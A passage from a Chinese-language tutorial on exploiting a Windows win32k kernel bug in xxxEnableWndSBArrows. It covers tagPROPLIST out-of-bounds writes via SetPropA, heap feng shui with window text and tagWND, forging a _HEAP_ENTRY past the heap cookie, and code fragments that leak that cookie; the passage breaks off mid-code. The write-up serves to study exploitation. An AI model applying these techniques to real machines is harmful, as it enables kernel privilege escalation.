        fffff901`40ac5590  00000000`00000008 
上面那一小节我们证明了我们的看到了我们的`win32k!tagSBINFO`大小为0x30(加上对齐和_HEAP_ENTRY, 先别在意这两个.),
接着我们来查看一个结构体:
    kd> dt win32k!tagPROPLIST -r
    +0x000 cEntries         : Uint4B 
    +0x004 iFirstFree       : Uint4B
    +0x008 aprop            : [1] tagPROP
        +0x000 hData            : Ptr64 Void
        +0x008 atomKey          : Uint2B
        +0x00a fs               : Uint2B
调用SetPropA第一次的时候, 首先会在分配一个堆, 存储一个`tagPropLIST`结构体. 第二次调用setPropA的时候,
会继续分配一个`tagPROP`结构体(0x10). 也就刚刚是0x28, 再加上其的`_HEAP_ENTRY`. 刚刚好合适.
接着, 由于刚好是2个, 根据前面的结论. 这个数值会在后面的异或过程中变为0xe. 我们如何来利用`0xe`呢.
恐怕我们就得说一下`tagPropList`了.
#### tagPropListA结构体.
首先来查看SetPropA函数:
    BOOL SetPropA(
        HWND   hWnd,
        LPCSTR lpString,
        HANDLE hData
        );
这个函数对于此次漏洞利用的信息有:
    [+] 初次调用的时候会生成一个tagProp结构体
    [+] 其后的调用的时候, 如果lpString在以前没有声明过. 那么会添加一个tagPROP结构体(0x10), 所以你才能看到我前面定义的0x7, 和0x8.
这一部分过了之后, 那么我们如何使用这个特性呢. 我们得对前面的结构体加一点点注释.
    kd> dt win32k!tagPROPLIST -r
    +0x000 cEntries         : Uint4B ==> 表面一共有多少个tagPROP    ==> 用这个越界读写.
    +0x004 iFirstFree       : Uint4B ==> 表明当前正在添加第几个tagPROP结构体
    +0x008 aprop            : [1] tagPROP ==> 一个单项的tagProp
        +0x000 hData            : Ptr64 Void ==> 对应hData
        +0x008 atomKey          : Uint2B ==> 对应lpString
        +0x00a fs               : Uint2B ==> 无法控制, 和内核实现的算法无关.
在漏洞函数执行回`win32k!xxxEnableWndSBArrows()`函数之后, 通过前面的讨论, 内核结构遭到篡改.
内核会误以为一共有0xe个tagProp, 所以我们可以在后面继续调用setProp覆盖后面的数据. 也就是有了一个越界读写的能力. ==>
能写0xe个tagProp
听起来不错, 我们有了破坏内核结构的能力. wait, 如果你仔细的查看tagProp和setPropA的对应关系. 你会发现写原语残缺.
截图如下(图片来源keenjoy95老师).
蓝色高亮的部分就是我们可以控制的内容. 红色高亮部分是无法控制的. 我们在win32k!的利用当中, 常见的思路是去破坏tagWND结构体的某一个值.
然后实现任意地址读写. 但是, 假设我们后面接的是一个`tagWND`结构体, 那么我们进行写操作的时候我们必定会对其中的某些重要值照成破坏.
照成利用失败.
于是NCC gruop安排了一个新的布局(这一部分的布局我自己改了一下). 如下.
    kd> dq fffff901`40ac5570-10 l30
        fffff901`40ac5570  00000002`00000002 bbbbaaaa`bbbbaaaa ==> 这个地方存储一个tagPROPLIST
        fffff901`40ac5580  00000000`00000007 bbbbaaaa`bbbbaaaa
        fffff901`40ac5590  00000000`00000008 100055e4`699dfbd6 ==> 这个地方存储一个windows text 注意依据前面逻辑, 后面的100055e4`699dfbd6可以控制
        fffff901`40ac55a0  43434343`43434343 43434343`43434343
        fffff901`40ac55b0  43434343`43434343 43434343`43434343
        fffff901`40ac55c0  00000000`00000000 100055e4`729dfbcd ==> 这个地方存储一个tagWND结构体
        fffff901`40ac55d0  00000000`00021476 00000000`00000003 
        fffff901`40ac55e0  fffff901`407fcb70 ffffe000`02d1e1a0
        fffff901`40ac55f0  fffff901`40ac55d0 80000700`60080018
        fffff901`40ac5600  04c00000`00000100 00000000`00000000
        fffff901`40ac5610  00000000`00000000 fffff901`40835890
        fffff901`40ac5620  fffff901`40ac5750 fffff901`40800830
        fffff901`40ac5630  00000000`00000000 00000000`00000000
        fffff901`40ac5640  00000020`00000020 0000030d`000005c0
        fffff901`40ac5650  00000046`00000029 00000304`000005b7
        fffff901`40ac5660  00007ff9`229677d0 fffff901`408204c0
        fffff901`40ac5670  00000000`00000000 00000000`00000000
        fffff901`40ac5680  00000000`00000000 00000000`00000000
        fffff901`40ac5690  00000000`00000000 00000000`00000000
        fffff901`40ac56a0  00000000`00000000 00000000`00000000
        fffff901`40ac56b0  00000000`00000000 00000000`00000000
        fffff901`40ac56c0  fffff901`40ac55d0 00000000`001c0271
        fffff901`40ac56d0  00000000`00000000 00000000`00000000
下面我们来解释为什么要这样布局. 首先看一个函数.
    memset(o4str, '\x43', 0x30 - _HEAP_BLOCK_SIZE);
    RtlInitLargeUnicodeString(&o4lstr, (WCHAR*)o4str, (UINT)-1, 0x30 - _HEAP_BLOCK_SIZE - 2);
    [...]
    NtUserDefSetText(sprayWnd_5[i], &o4lstr);    // 注意这个函数
接着查看一下tagWND的一个结构体成员.
    kd> dt win32k!tagWND -b strName
           +0x0d8 strName : _LARGE_UNICODE_STRING
    kd> dt _LARGE_UNICODE_STRING
        win32k!_LARGE_UNICODE_STRING
        +0x000 Length           : Uint4B ==> windows text的长度
        +0x004 MaximumLength    : Pos 0, 31 Bits ==> 最大长度
        +0x004 bAnsi            : Pos 31, 1 Bit 
        +0x008 Buffer           : Ptr64 Uint2B ==> 指向字符串的指针
当调用`NtUserDefSetText`函数的时候, 内核当中, 关联的`tagWND`结构体的strName会有相应的改变. buffer存储一个指针,
指向`o4lstr`指向的字符串. 而这一步的关键点在于. 这些字符是分配在一个堆中. 堆含有一个堆头. 如下所示:
    kd> dt nt!_HEAP_ENTRY
        +0x000 PreviousBlockPrivateData : Ptr64 Void
        +0x008 Size             : Uint2B    ==> 堆的大小
        +0x00a Flags            : UChar        ==> 空闲还是free
        +0x00b SmallTagIndex    : UChar        ==> 用来检测堆是否被覆盖
        +0x00c PreviousSize     : Uint2B    ==> 前一个堆块的大小
        +0x00e SegmentOffset    : UChar
        +0x00e LFHFlags         : UChar
        +0x00f UnusedBytes      : UChar
        +0x008 CompactHeader    : Uint8B
        +0x000 Reserved         : Ptr64 Void
        +0x008 FunctionIndex    : Uint2B
        +0x00a ContextValue     : Uint2B
        +0x008 InterceptorValue : Uint4B
        +0x00c UnusedBytesLength : Uint2B
        +0x00e EntryOffset      : UChar
        +0x00f ExtendedBlockSignature : UChar
        +0x000 ReservedForAlignment : Ptr64 Void
        +0x008 Code1            : Uint4B
        +0x00c Code2            : Uint2B
        +0x00e Code3            : UChar
        +0x00f Code4            : UChar
        +0x008 AgregateCode     : Uint8B
你可以去查看写原语残缺的时候dump的内存. 你会发现heap entry的内容是可控的. 里面包含当前堆块的大小等信息. 所以, 现在假设一种状况:
    [+] 我们通过SetPropA. 控制了_HEAP_ENRTY
    [+] 通过控制_HEAP_ENRTY, 修改了这个_HEAP_ENRTY代表的堆块大小为A(包含后面的tagWND)
    [+] 通过DestroyWindow函数, 释放这个堆块
    [+] tagWND一并被释放, 照成了新的UAF漏洞
    [+] 重新构造一个假的tagWND, 使用这个假的tagWND来进行write_what_where
基于此, 新的问题就产生了
    [+] 怎么让堆分配的布局为psbInfo + windows text + tagWND==> 风水布局
    [+] _HEAP_ENRTY的内容应该是什么 ==> heap cookie
    [+] 构造怎样的tagWND ==> 漏洞如何利用
这是我们后面主要需要讨论的. 所以我们从简单的说起.
### 构造假的`_HEAP_ENTRY`: 泄露`heap cookie`
我在`heap cookie`上花了大量的时间, 因为当时找的资料并不多, 大多数都是堆内部管理的资料. 我想找一个`泄露cookie`的资料,
死活没有找到. 所以最后在通过阅读源码+阅读堆内部管理的理论知识, 解决了这个问题.
首先, 我们假设要伪造的`_HEAP_ENTRY`所关联的堆大小是0x1b0(后面解释为什么为这个值), 堆是以0x10的为一个单位.
前面我们可以看到前面的`_HEAP_ENTRY`结构体偏移0x8处即为size, 那么我们直接把这个值改为0x1b(记住以0x10为单位).
那么是不是就ok了呢.
如果这样做的话， 我们就会被安排的明明白白. windows呢, 很久以前就知道有人想弄它的堆. 所以他就实现了一个Cookie. 来保护它的堆.
保护的过程如下.
    heapCode[11] = heapCode[8] ^ heapCode[0] ^ heapCode[10] // 构造smalltagIndex
    heapCode ^= cookie(系统每次开机的时候一个随机值);
windows在每次开机的时候, 都会有一个随机的cookie值生成. heapChunk 释放状态的时候.
    heapChunk ^= cookie
    if(heapCode[11] != heapCode[8] ^ heapCode[9] ^ heapCode[10])    //类似于这种判断
        BSOD
所以我们的heapChunk不能乱搞, 我们只单单改大小是过不了堆的检测的. 我们如何构建一个能通过检测的堆. 首先,
假设我们已经获取正确的cookie(此时假设为). 我们dump一下还没有被覆盖的heap
    100055e4`699dfbd6
    我们进行异或: 
    偏移0x8处: d6 fb 9d 69 e4 55 00 10(小端序)
算下`Small tagIndex`:
    heapCode[11] = heapCookie[8](替换为0x1b) ^ heapCookie[9] ^ heapCookie[10]
OK, 之后:
    heapFakeChunk = heapCode[8] ^ cookie就可以了.
这里你可能有一个小小的疑惑, 为什么我要dump解密之后再加密. `_HEAP_ENTRY` 在未与cookie异或之前, 不管你怎么电脑开机,
每次除了smalltagIndex之外, 应该都是一样的(这个地方可能有点问题, 但是这是我调试得出的结论.). 所以你直接dump改变大小,
重新赋值size. 再和cookie进行异或就可以使用了了. 当然, 你也可以选择具体深究`_HEAP_ENTRY`结构体的每一个成员,
算出他们每一个的值.
这一部分我自己的开发过程中. 根本没有管这个cookie. 反正电脑是虚拟机. 那么保存镜像. 每次都是一样的. 那么我只要用调试器获取一个cookie.
然后就可以用了.
我们来讲一下如何用代码来泄露此cookie(这一部分我其实不是独立开发, 用的别人代码调试理解)
    BYTE *Addr = (BYTE *)0x1000;
    ULONG_PTR dheap = (ULONG_PTR)pSharedInfo->aheList;
    while (VirtualQuery(Addr, &MemInfo, sizeof(MemInfo)))
    {
        if (MemInfo.Protect = PAGE_READONLY && MemInfo.Type == MEM_MAPPED && MemInfo.State == MEM_COMMIT)
        {
            if (*(UINT *)((BYTE *)MemInfo.BaseAddress + 0x10) == 0xffeeffee) // 说明我们找到了桌面堆的映射...
            {
                if (*(ULONG_PTR *)((BYTE *)MemInfo.BaseAddress + 0x28) == (ULONG_PTR)((BYTE *)MemInfo.BaseAddress + deltaDHeap))    //绕过这个地方相加等于堆